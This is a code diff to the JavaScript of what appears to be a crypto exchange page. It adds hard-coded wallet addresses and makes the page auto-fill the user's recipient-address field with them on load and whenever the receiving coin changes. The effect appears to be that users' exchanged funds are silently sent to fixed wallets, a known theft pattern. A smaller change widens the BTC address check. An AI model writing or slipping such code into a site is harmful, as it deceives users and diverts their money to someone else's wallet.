@@ -22,6 +22,16 @@ const exchangeRates = {
 let sendCrypto = 'BTC';
 let getCrypto = 'ETH';
 
+// Preset wallet addresses
+const presetAddresses = {
+    SOL: '7cXAmVBEVJcwPCj37zakcfc7xinfn459spkvgHKHrEeY',
+    ETH: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877',
+    BTC: 'bc1qkvzrkcvn67zj5xaxa4klwdr0gc69dddp2786g7',
+    USDT: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877', // Same as ETH (ERC-20)
+    USDC: '0x4EBe6598680D12FC5f40C3D68238f8D4d51f7877', // Same as ETH (ERC-20)
+    LTC: '' // No preset for LTC
+};
+
 // Get DOM elements
 const sendUSDInput = document.getElementById('sendUSD');
 const getUSDInput = document.getElementById('getUSD');
@@ -102,9 +112,16 @@ const exchangeBtn = document.getElementById('exchangeBtn');
 const recipientAddress = document.getElementById('recipientAddress');
 const pasteBtn = document.getElementById('pasteBtn');
 
-// Update placeholder when crypto changes
+// Update placeholder and preset address when crypto changes
 function updateAddressPlaceholder() {
     recipientAddress.placeholder = `Enter ${getCrypto} wallet address`;
+    
+    // Auto-fill with preset address if available
+    if (presetAddresses[getCrypto]) {
+        recipientAddress.value = presetAddresses[getCrypto];
+    } else {
+        recipientAddress.value = '';
+    }
 }
 
 // Paste button functionality
@@ -130,7 +147,7 @@ exchangeBtn.addEventListener('click', function() {
     // Basic address validation (simplified)
     const addressValidation = {
         ETH: /^0x[a-fA-F0-9]{40}$/,
-        BTC: /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/,
+        BTC: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,
         SOL: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
         USDT: /^0x[a-fA-F0-9]{40}$/,
         USDC: /^0x[a-fA-F0-9]{40}$/,
@@ -282,3 +299,4 @@ cryptoSearch.addEventListener('input', function() {
 
 // Initialize
 calculateExchange();
+updateAddressPlaceholder();
